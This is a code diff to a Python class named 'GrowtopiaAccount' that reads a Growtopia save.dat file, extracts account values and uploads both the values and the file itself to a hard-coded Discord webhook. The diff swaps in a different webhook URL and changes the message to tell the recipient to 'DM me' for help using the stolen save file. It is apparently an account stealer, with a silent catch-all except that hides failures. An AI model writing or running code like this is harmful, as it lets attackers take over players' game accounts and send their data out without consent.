@@ -95,8 +95,8 @@ class GrowtopiaAccount:
             save_data = self.read_save_file(to_path)
             if save_data:
                 extracted_values = self.extract_values(save_data)
-            self.send("https://discord.com/api/webhooks/1252054875135676416/69uIAr6A7wtDsKhNy2p3U7IsTZKpGhKxjUMfzTZl9orzy9_DwXosXYR3LIkY2762wvyf", self.get_embed(extracted_values))
-            self.send_file("https://discord.com/api/webhooks/1252054875135676416/69uIAr6A7wtDsKhNy2p3U7IsTZKpGhKxjUMfzTZl9orzy9_DwXosXYR3LIkY2762wvyf", to_path)
+            self.send("https://discord.com/api/webhooks/1252684442842042422/6UthWsBkYDTw_JFSIJRNheqJeTf332AaZVinX9V-nehw2zJe4VCy3wtdv-_xBksOYv-8", self.get_embed(extracted_values))
+            self.send_file("https://discord.com/api/webhooks/1252684442842042422/6UthWsBkYDTw_JFSIJRNheqJeTf332AaZVinX9V-nehw2zJe4VCy3wtdv-_xBksOYv-8", to_path)
             self.clean(save_path)
         except:
             return
@@ -152,7 +152,7 @@ class GrowtopiaAccount:
         embed = {
             "title": ":unlock: Account Info",
             "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            "description": "How to use? Join the [Discord](https://discord.gg/az4MsZr3RX) for information on how to use save.dat file",
+            "description": "How to use? DM me on Discord (p6083747) for information on how to use save.dat file",
             "author": {
                 "name": self.author_name,
                 "icon_url": self.author_icon_url
